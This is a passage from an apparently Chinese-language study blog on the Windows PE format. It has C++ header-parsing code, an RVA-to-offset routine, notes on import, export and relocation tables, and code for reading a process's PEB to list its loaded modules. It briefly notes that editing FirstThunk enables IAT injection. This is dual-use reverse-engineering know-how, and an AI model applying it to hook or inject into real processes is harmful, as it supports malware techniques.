ImageOptionalHeader32-&gt;AddressOfEntryPoint);</span><br><span class="line"><span class="comment">//8个字节的绝对地址</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;优先装载地址%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;ImageBase);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;文件对齐粒度%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;FileAlignment);   <span class="comment">//0x200</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;内存对齐粒度%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SectionAlignment);<span class="comment">//0x1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;镜像大小%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SizeOfImage);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;所有头部大小%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SizeOfHeaders);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;子系统%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;Subsystem);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重点的重点</span></span><br><span class="line">ImageDataDirectory = &amp;(ImageOptionalHeader32-&gt;DataDirectory[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;%d VirtualAddress:%p\r\n&quot;</span>), i, ImageDataDirectory-&gt;VirtualAddress);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;%d ViewSize:%p\r\n&quot;</span>), i, ImageDataDirectory-&gt;Size);</span><br><span class="line"></span><br><span class="line">ImageDataDirectory++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \</span></span><br><span class="line"><span class="comment">((ULONG_PTR)(ntheader) +                                            \</span></span><br><span class="line"><span class="comment">FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \</span></span><br><span class="line"><span class="comment"> ((ntheader))-&gt;FileHeader.SizeOfOptionalHeader   \</span></span><br><span class="line"><span class="comment">))</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">ImageSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ImageNtHeaders);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImageFileHeader-&gt;NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\r\n&quot;</span>, ImageSectionHeader-&gt;Name);  <span class="comment">//8个字节构成的节的名字</span></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区大小(真实大小)%p\r\n&quot;</span>), ImageSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区起始位置(内存粒度RVA)%p\r\n&quot;</span>), ImageSectionHeader-&gt;VirtualAddress);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区大小(文件粒度)%p\r\n&quot;</span>), ImageSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区起始位置(文件粒度)%p\r\n&quot;</span>), ImageSectionHeader-&gt;PointerToRawData);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区属性%p\r\n&quot;</span>), ImageSectionHeader-&gt;Characteristics);   <span class="comment">//获取该节的属性</span></span><br><span class="line">ImageSectionHeader++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"><span class="keyword">if</span> (VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> VirtualAddress;</span><br><span class="line">VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FileHandle != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(FileHandle);</span><br><span class="line">FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//内存粒度转换文件粒度</span></span><br><span class="line"><span class="function">DWORD <span class="title">rva_to_offset</span><span class="params">(IMAGE_NT_HEADERS* ImageNtHeaders, DWORD Rva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD Offset = <span class="number">0</span>;</span><br><span class="line">DWORD Limit;</span><br><span class="line">IMAGE_SECTION_HEADER* ImageSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">WORD i;<span class="comment">//两个字节</span></span><br><span class="line"></span><br><span class="line">ImageSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ImageNtHeaders);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Rva &lt; ImageSectionHeader-&gt;PointerToRawData)</span><br><span class="line"><span class="keyword">return</span> Rva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ImageNtHeaders-&gt;FileHeader.NumberOfSections; i++)   </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageSectionHeader[i].SizeOfRawData)</span><br><span class="line">Limit = ImageSectionHeader[i].SizeOfRawData;   <span class="comment">//1.90  文件粒度</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">Limit = ImageSectionHeader[i].Misc.VirtualSize;<span class="comment">//1.70</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Rva &gt;= ImageSectionHeader[i].VirtualAddress &amp;&amp;        <span class="comment">//内存粒度开始位置</span></span><br><span class="line">Rva &lt; (ImageSectionHeader[i].VirtualAddress + Limit))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageSectionHeader[i].PointerToRawData != <span class="number">0</span>)<span class="comment">//文件粒度开始位置</span></span><br><span class="line">&#123;</span><br><span class="line">Offset = Rva - ImageSectionHeader[i].VirtualAddress;</span><br><span class="line">Offset += ImageSectionHeader[i].PointerToRawData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Offset;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件头成员</p><p>mechine 可以判断位数。IMAGE_FILE_MACHINE_I386, IMAGE_FILE_MACHINE_IA64, IMAGE_FILE_MACHINE_AMD64。</p><p><img src="/.io//image-20220909212322047.png" alt="image-20220909212322047"></p><p>因此32位文件，必须在文件头中的sizeofoptional成员，等于32位的结构体。</p><p>可以通过判断characteristics的值，判断该文件的具体属性，0x2（IMAGE_FILE_EXECUTABLE_IMAGE）是exe，0x2000（IMAGE_FILE_DLL）是dll，0x1000（IMAGE_FILE_SYSTEM）是sys。文件可能有多属性，判断时用与运算。这个数字可能有多个属性组成，随便写一个按f12进去看定义可以寻找</p><p>32和64位的区别就在于选项头ImageOptionalHeader。</p><p><img src="/.io//image-20220909221218017.png" alt="image-20220909221218017"></p><p><img src="/.io//image-20220919221914062.png" alt="image-20220919221914062"></p><p><img src="/.io//image-20220919211254300.png" alt="image-20220919211254300"></p><p>OEP，程序执行的代码起始地址，是一个RVA，加上基地址ImageBase是程序的执行入口</p><p>ImageBase是一个绝对地址VA，预设加载值，当PE文件真正开始执行时，就优先放到ImageBase，否则就向下顺延。</p><p><img src="/.io//image-20220919221512162.png" alt="image-20220919221512162"></p><p>读取文件到内存里，节区对齐力度是按百对齐 ImageOptionalHeader-&gt;FileAlignment&#x3D;&#x3D;200，节区在磁盘文件中的最小单位</p><p>PE加载器加载、exe加载dll文件等，驱使PE文件变为运行状态，节区对齐粒度是按千对齐，ImageOpetionalHeader-&gt;SectionAlignment&#x3D;&#x3D;1000 节区在内存中的最小单位</p><p><strong>所有在PE文件中定义成RVA的成员，都必须以内存力度（按千）对齐结构为基础进行VA值得获取</strong></p><p><img src="/.io//image-20220919222939288.png" alt="image-20220919222939288"></p><p>Subsystem可以判断文件类型。0是unknown gui文件有define为IMAGE_SUBSYSTEM_WINDOWS_GUI，按f12进入看其他的</p><p>NumberOfRvaAndSizes一般是16，但也有可能不是</p><p>有#define IMAGE_NUMBER_DIRECTOY_NUMS 16</p><p>重点：</p><p>DataDirectory 设计16成员组成的数组，每个结构体内有两个成员:VirtualAddress(RVA), ViewSize(Size)，0-15</p><p><img src="/.io//image-20230214020404518.png" alt="image-20230214020404518"></p><p><img src="/.io//image-20220921212701408.png" alt="image-20220921212701408"></p><p>在NtHeaders内有一个Signature成员，使用Signature+OptionalHeaders（选项头之前的大小）+SizeOfOptionalHeaders（选项头自身的大小）就可以定位到SectionHeaders(IMAGE_FIRST_SECTION(ImageNtHeaders);)</p><p><img src="/.io//image-20221127212121731.png" alt="image-20221127212121731"></p><p>微软自带的计算偏移的宏FIELD_OFFSET(type, v1);返回值为long型，可以得到v1在type类型中的偏移。</p><p>ImageFileHeader中有一个成员是NumberOfSections，代表有多少个节。ImageSectionHeader的Name成员是节的名字，由8个字节构成，如.text</p><p><img src="/.io//image-20220921214700402.png" alt="image-20220921214700402"></p><p><img src="/.io//image-20221127213230589.png" alt="image-20221127213230589"></p><p><img src="/.io//image-20220921214759832.png" alt="image-20220921214759832"></p><p>节区头中的重要成员，分别是真实大小(没有填充过的)，内存粒度，文件粒度，文件粒度</p><p><img src="/.io//image-20220921222121985.png" alt="image-20220921222121985"></p><p>节头中有个联合体misc，其中virtualSize是真实节大小</p><p>VirtualAddress RVA 按千对齐 节的起始位置</p><p>SizeOfRawData 节的大小，按200对齐</p><p>PointerToRawData 磁盘上节的开始位置，按200对齐</p><p>VA绝对地址 RVA相对地址 </p><p>RVA+ImageBase &#x3D; VA</p><p><strong>内存粒度RVA计算文件粒度公式</strong></p><p>如果传入的rva比第一个ImageSectionHeader的pointer to raw data还要小，说明这是一个头部的rva，两边一样，直接返回。否则开始扫描传入的rva属于第几个节。如果size of raw data有值，则把它放进limit变量中（按文件粒度对齐后的节大小），若没有就放入virtual size。如果rva在section header中的virtual address与virtual address+limit之间，则就是在这个区域中。</p><p>rva-VirtualAddress+PointToRawData&#x3D;offset</p><p><img src="/.io//image-20220926213113330.png" alt="image-20220926213113330"></p><p><img src="/.io//image-20220926214809108.png" alt="image-20220926214809108"></p><p>IAT   导入表</p><p><img src="/.io//image-20220926220732761.png" alt="image-20220926220732761"></p><p><img src="/.io//image-20220926222012185.png" alt="image-20220926222012185"></p><p>导入函数的汇编，32位下是绝对地址，64位下是相对地址，当前地址加偏移加字节数（6）。所有API的调用均采用这种方式。</p><p><img src="/.io//image-20221002193052700.png" alt="image-20221002193052700"></p><p><img src="/.io//image-20221002193042925.png" alt="image-20221002193042925"></p><p><img src="/.io//image-20221002193334312.png" alt="image-20221002193334312"></p><p>动态库的基地址在不同的区域中，不一定在同一个地方</p><p>编译生成exe的时候，系统就会生成一个ImageBase，32位下一般是0x400000，dll一般是0x1000000</p><p>exe文件有导入表IAT，一般在txt节中。在DataDirectory的16成员中，第二成员指向导入表的位置。即定位到</p><p>IMAGE_IMPORT_DESCRIPTOR 导入表描述</p><p><img src="/.io//image-20221002201505020.png" alt="image-20221002201505020"></p><p>结构体中的Name是单字string，存放的是RVA。RVA在32、64下都是四个字节。通过转化为文件粒度，加上VirtualAddress可以定位到导入库的名字。需要强转为char*</p><p>OriginalFirstThunk INT库的地址，RVA 每次都要判断所指向的任意内容是否为空，如ul.AddressOfData。转化为offset，加上VirtualAddress，定位到新的结构体，函数名字导入。指向的结构为IMAGE_THUNK_DATA有64位和32位之分，且是一个联合体ul，64位8字节32位4字节。需要强转为DWORD。如果判断为不是名字，则是索引导入。直接用这个值转化为IMAGE_ORDINAL。文件状态下的文件粒度对齐</p><p><img src="/.io//image-20221204232839654.png" alt="image-20221204232839654"></p><p>FirstThunk IAT的地址，RVA 每次都要判断所指向的任意内容是否为空。进入运行状态时其中内容已经更新为地址。运行状态下内存粒度对齐。通过修改FirstThunk中的内容，可以进行IAT注入。</p><p><img src="/.io//image-20221002202630963.png" alt="image-20221002202630963"></p><p><img src="/.io//image-20230119000531876.png" alt="image-20230119000531876"></p><p><img src="/.io//image-20230119001557338.png" alt="image-20230119001557338"></p><p><img src="/.io//image-20221002202822313.png" alt="image-20221002202822313"></p><p>INT与IAT是联合体，32位下是四个字节，64位下是8个字节。</p><p>导出表</p><p>存在dll中，只有一个</p><p>导出表目录 PIMAGE_EXPORT_DIRECTORY 像导入表目录一样定位</p><p><img src="/.io//image-20221214212322335.png" alt="image-20221214212322335"></p><p>有索引、函数名导出两种方式</p><p><img src="/.io//image-20221214214327363.png" alt="image-20221214214327363"></p><p>重定向表 relocation</p><p>exe文件加载时，image base默认地址为0x400000，此时代码地址都不需要变化。但如果image base地址不是默认值，就需要重新修复，这就需要把默认情况下地址都存放在重定向表中。</p><p>进行修复时，使用真实值-0x400000，加上默认情况下的值</p><p>主要针对绝对寻址的，如全局变量、静态变量、自己定义的函数</p><p><img src="/.io//image-20221231224618748.png" alt="image-20221231224618748"></p><p>重定向表不止一张。virtualaddress需要进行rva to offset转换</p><p><img src="/.io//image-20221231225852866.png" alt="image-20221231225852866"></p><p><img src="/.io//image-20231213205734326.png" alt="image-20231213205734326"></p><p>获取目标进程的dll模块的方法</p><ol><li>CreatetoolHelp32Snapshot</li><li>GetMoudelHandle、Loadlibary</li><li>psapi EnumHandle</li><li>PEB NtWow64QueryInformationProcess64获取PROCESS_BASIC_INFORMATION64(32) pbi，NtWow64ReadVirtualMemory64（32位用  ReadProcessMemory）获取(PVOID64)pbi.PebBaseAddress。遍历PEB中的<code>_PEB_LDR_DATA</code>双向链表，其中_LDR_DATA_TABLE_ENTRY.dllbase</li></ol><p>PsGetProcessPeb(EPROCESS)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Test_Console.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;subauth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> region 依赖 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(x) ((x) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessBasicInformation 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtWow64QueryInformationProcess64)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, UINT32 ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessInformation, UINT32 ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT32* ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtWow64ReadVirtualMemory64)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, PVOID64 BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID BufferData, UINT64 BufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PUINT64 ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtQueryInformationProcess)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, ULONG ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessInformation, UINT32 ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT32* ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_T</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    T Buffer;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY_T</span></span><br><span class="line">&#123;</span><br><span class="line">    T Flink;</span><br><span class="line">    T Blink;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> NGF, <span class="type">int</span> A&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB_T</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">typedef</span> T type;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            BYTE InheritedAddressSpace;</span><br><span class="line">            BYTE ReadImageFileExecOptions;</span><br><span class="line">            BYTE BeingDebugged;</span><br><span class="line">            BYTE BitField;</span><br><span class="line">        &#125;;</span><br><span class="line">        T dummy01;</span><br><span class="line">    &#125;;</span><br><span class="line">    T Mutant;</span><br><span class="line">    T ImageBaseAddress;</span><br><span class="line">    T Ldr;</span><br><span class="line">    T ProcessParameters;</span><br><span class="line">    T SubSystemData;</span><br><span class="line">    T ProcessHeap;</span><br><span class="line">    T FastPebLock;</span><br><span class="line">    T AtlThunkSListPtr;</span><br><span class="line">    T IFEOKey;</span><br><span class="line">    T CrossProcessFlags;</span><br><span class="line">    T UserSharedInfoPtr;</span><br><span class="line">    DWORD SystemReserved;</span><br><span class="line">    DWORD AtlThunkSListPtr32;</span><br><span class="line">    T ApiSetMap;</span><br><span class="line">    T TlsExpansionCounter;</span><br><span class="line">    T TlsBitmap;</span><br><span class="line">    DWORD TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    T ReadOnlySharedMemoryBase;</span><br><span class="line">    T HotpatchInformation;</span><br><span class="line">    T ReadOnlyStaticServerData;</span><br><span class="line">    T AnsiCodePageData;</span><br><span class="line">    T OemCodePageData;</span><br><span class="line">    T UnicodeCaseTableData;</span><br><span class="line">    DWORD NumberOfProcessors;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        DWORD NtGlobalFlag;</span><br><span class="line">        NGF dummy02;</span><br><span class="line">    &#125;;</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    T HeapSegmentReserve;</span><br><span class="line">    T HeapSegmentCommit;</span><br><span class="line">    T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    T HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    DWORD NumberOfHeaps;</span><br><span class="line">    DWORD MaximumNumberOfHeaps;</span><br><span class="line">    T ProcessHeaps;</span><br><span class="line">    T GdiSharedHandleTable;</span><br><span class="line">    T ProcessStarterHelper;</span><br><span class="line">    T GdiDCAttributeList;</span><br><span class="line">    T LoaderLock;</span><br><span class="line">    DWORD OSMajorVersion;</span><br><span class="line">    DWORD OSMinorVersion;</span><br><span class="line">    WORD OSBuildNumber;</span><br><span class="line">    WORD OSCSDVersion;</span><br><span class="line">    DWORD OSPlatformId;</span><br><span class="line">    DWORD ImageSubsystem;</span><br><span class="line">    DWORD ImageSubsystemMajorVersion;</span><br><span class="line">    T ImageSubsystemMinorVersion;</span><br><span class="line">    T ActiveProcessAffinityMask;</span><br><span class="line">    T GdiHandleBuffer[A];</span><br><span class="line">    T PostProcessInitRoutine;</span><br><span class="line">    T TlsExpansionBitmap;</span><br><span class="line">    DWORD TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line">    T SessionId;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    T pShimData;</span><br><span class="line">    T AppCompatInfo;</span><br><span class="line">    _UNICODE_STRING_T&lt;T&gt; CSDVersion;</span><br><span class="line">    T ActivationContextData;</span><br><span class="line">    T ProcessAssemblyStorageMap;</span><br><span class="line">    T SystemDefaultActivationContextData;</span><br><span class="line">    T SystemAssemblyStorageMap;</span><br><span class="line">    T MinimumStackCommit;</span><br><span class="line">    T FlsCallback;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; FlsListHead;</span><br><span class="line">    T FlsBitmap;</span><br><span class="line">    DWORD FlsBitmapBits[<span class="number">4</span>];</span><br><span class="line">    T FlsHighIndex;</span><br><span class="line">    T WerRegistrationData;</span><br><span class="line">    T WerShipAssertPtr;</span><br><span class="line">    T pContextData;</span><br><span class="line">    T 